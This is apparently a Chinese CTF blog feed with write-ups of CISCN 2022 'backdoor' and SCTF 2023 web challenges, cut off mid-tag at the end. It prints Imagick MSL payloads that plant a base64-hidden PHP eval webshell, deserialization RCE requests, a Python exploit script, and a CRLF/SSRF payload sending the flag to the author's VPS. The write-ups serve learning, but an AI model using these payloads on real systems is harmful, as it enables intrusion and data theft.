application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;image&gt;</span></span><br><span class="line"><span class="comment"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span></span><br><span class="line"><span class="comment"> &lt;write filename=&quot;/tmp/sess_snakin&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;/image&gt;</span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979--</span></span><br></pre></td></tr></table></figure><p>这里就是强制文件上传    <code>xml</code>这些内容就会上传到<code>/tmp/php*</code>   临时文件下  </p><p>接着因为<code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code>  初始会执行<code>msl</code>语言，所以临时文件里的内容就会被执行  </p><p>就是将序列化好的字符进行base64编码  然后传入<code>/tmp/sess_snakin</code>下</p><p><img src="../images/image-20230621163522068.png" alt="image-20230621163522068"></p><p>随后使用执行一次任意无参函数的功能，触发<code>session_start</code>函数，并设置<code>cookie</code>为<code>PHPSESSID=snakin</code>，即可文件包含<code>session</code>，成功<code>RCE</code>。<code>flag</code>执行根目录的<code>readflag</code>即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>session_start%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=snakin</span></span><br></pre></td></tr></table></figure><p>上面的传的序列化字符就是为了开启<code>session_start()</code>的</p><p><strong>然后就会进行反序列化将path给赋值，反序列化完后再进行序列化，将序列化后的执行存入存储介质中 因为session文件中含有php代码，包含的时候就会执行</strong>  </p><p>上面就是<code>imagick</code>配合<code>session</code>进行rce的过程了</p>]]></content>
      
      
      
        <tags>
            
            <tag> ciscn决赛-2022-backdoor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf-web-2023</title>
      <link href="/posts/99a58670.html"/>
      <url>/posts/99a58670.html</url>
      
        <content type="html"><![CDATA[<h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a><strong>ezcheck1n</strong></h2><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/hint提示是</span><br><span class="line"></span><br><span class="line">find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server</span><br><span class="line"></span><br><span class="line">去寻找flag在哪</span><br><span class="line"></span><br><span class="line">他看来有两个路由有P在配置文件中</span><br><span class="line"></span><br><span class="line">nss的考点中有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>后端是 Server: Apache/2.4.54 (Debian) 中间件是 Server: Apache/2.4.55 (Unix)</strong></p><p><strong>这就是题目提示的两个容器的意思</strong></p><p><img src="../images/image-20230620194824661.png" alt="image-20230620194824661"></p><p>但是试了一下  发现不行  就没往这方面想了   没想到的最后wp里还是用它</p><p>(就是在其基础上修改一下就行了)</p><p><img src="../images/image-20230620195107173.png" alt="image-20230620195107173"></p><p><strong>题目就是提示了这几点  <code>post</code>指的是<code>post.jpeg</code>  然后就会看到下面的这个2022</strong></p><p>(就是当时想不明白这个url有啥用。。。。。。。)</p><p>这里的<code>url</code>是用来ssrf然后将flag带出到自己的vps监听端口上</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/2023/1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/2022.php%3furl%3d101.42.39.110:3389%253fa%253d</span><br></pre></td></tr></table></figure><p>这里的<code>2022.php</code>是猜出来的，因为题目给了是<code>show_source(2023.php)</code>   然后图片给的是2022，使用就是靠这里猜出来的</p><p><img src="../images/image-20230620201530382.png" alt="image-20230620201530382"></p><p><img src="../images/image-20230620201513988.png" alt="image-20230620201513988"></p><h2 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h2><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）</span><br></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FUNC_LIST&quot;</span>, <span class="title function_ invoke__">get_defined_functions</span>());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[flag]/m&#x27;</span>, <span class="variable">$this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">is_string</span>(<span class="variable">$func</span>) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">            <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:/tmp&quot;);</code></p><p>  这里的代码将 <code>open_basedir</code> 配置选项设置为当前目录以及 <code>/tmp</code> 目录，因此 PHP 脚本只能访问当前目录和 <code>/tmp</code> 目录下的文件，无法访问其他目录。</p><p>这道题是根据这个题改的</p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a></p><p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/</a></p><p><strong>这里的多一嘴来讲讲这个参考的这个<code>backdoor</code></strong>     <a href="https://ke1nys.github.io/posts/869a12bf.html">ciscn决赛-2022-backdoor</a></p><p>稍微改了点，include变为了readdir，因此我们很难getshell。那就改变思路了。首先我们知道flag是在根目录的，但是由于open_basedir我们并没有权限去读取，因此我们需要配合imagick的msl语言特性，把flag读到/tmp目录下，然后再利用上述payload去触发__sleep，读取flag文件<br>首先我们需要用如下payload把flag移动到tmp目录下</p><p><strong>先去触发<code>phpinfo</code>()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fumo_backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621164501671.png" alt="image-20230621164501671"></p><p>开启了<code>imagick</code>扩展</p><p><strong>思路</strong></p><ul><li>先进行临时文件上传 然后创建一个session_xxx文件，然后imagick初始化的时候会执行临时文件里的内容如何值就会赋给session_xxx文件</li></ul><p>(<strong>这里会创建两个文件，一个用来存序列化的数据(这里的path必须是第二次session的名字)，为了给path赋值，另一个是为了存flag</strong>)</p><ul><li>第二步还是进行临时文件上传  然后还是创建一个文件(必须和第一次不同名字)  内容是将flag移到该文件中   就是移到第二步设置的文件中</li></ul><ul><li>第三步进行session_start()的开启   来触发第一次session的反序列化(<strong>为了设置path,反序列化结束后会接着会序列</strong>)  然后可以读取到flag了</li></ul><p>因为这里的是公共容器，会容易被删除自己刚创建的session文件  所以需要python脚本</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.99.77.113:18080/?cmd=unserialze&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:18080/?cmd=unserialze&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep</span>():</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    <span class="comment"># rm</span></span><br><span class="line">    r = requests.get(<span class="string">&quot;http://47.99.77.113:18080/?cmd=rm&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    sleep()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;hack.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>hack.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8P3BocCBldmFsKCRfR0VUWzFdKTs/PnxPOjEzOiJmdW1vX2JhY2tkb29yIjozOntzOjQ6InBhdGgiO3M6OToiL3RtcC9GTEFHIjtzOjQ6ImFyZ3YiO047czoxOiJjIjtOO30=&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/sess_tel&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621180951791.png" alt="image-20230621180951791"></p><p><strong>lfi.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;app1:/flag&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/FLAG&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621182457074.png" alt="image-20230621182457074"></p><p><strong>这里用那个<code>mvg</code>  <code>app1</code>   <code>uyvy</code> 能直接读取flag</strong></p><p>还有一种办法就是fuzz测试来测试哪种可以用来使用</p><h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><h3 id="提示-hint"><a href="#提示-hint" class="headerlink" title="提示/hint"></a>提示/hint</h3><p>a piece of cake but hard work。per 5 min restart.<br>pay attention to <code>/app/app.py</code></p><p><img src="../images/image-20230621201841266.png" alt="image-20230621201841266"></p><p>题目的页面就是这样</p><p>这里的话是先使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> (<strong>后面跟的是上传内容</strong>)  来强制<code>session start</code></p><p>在使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 时，如果 <code>session</code> 没有开启，系统会自动开启一个新的 session。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://115.239.215.75:8081/ -H &quot;Cookie: PHPSESSID=tel&quot; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=111&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621203954292.png" alt="image-20230621203954292"></p><p>然后交给gpt就行了</p><p><strong>得到源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>], <span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is the object: <span class="subst">$object</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://115.239.215.75:8081/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这个来上传抓包  然后添加PHPSESSID=xxx也行</strong>)</p><p>这里的考点主要是靠原生类   <a href="https://ke1nys.github.io/posts/28e06bac.html#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">ctfshow-愚人杯也考过这个考点</a></p><p>主要是有三个利用点 </p><ul><li>$object-&gt;sctf();</li><li>$object = new $type($properties[0], $properties[1]);</li><li>$object = file_get_contents(‘<a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a>‘ . $properties);</li></ul><p><strong>研究了一下，发现只有中间这个有用   并且类和参数都可控 </strong> <strong>用extract来控制</strong></p><p>(由于题目说的<code>/app/app.py</code>，那么我们就得去用原生类来读取这个文件)</p><p><code>$object = new $type($properties[0], $properties[1]);</code>   然后因为这里有两个参数   所以就得去找找既能读取文件，又是两个参数的原生类</p><p><img 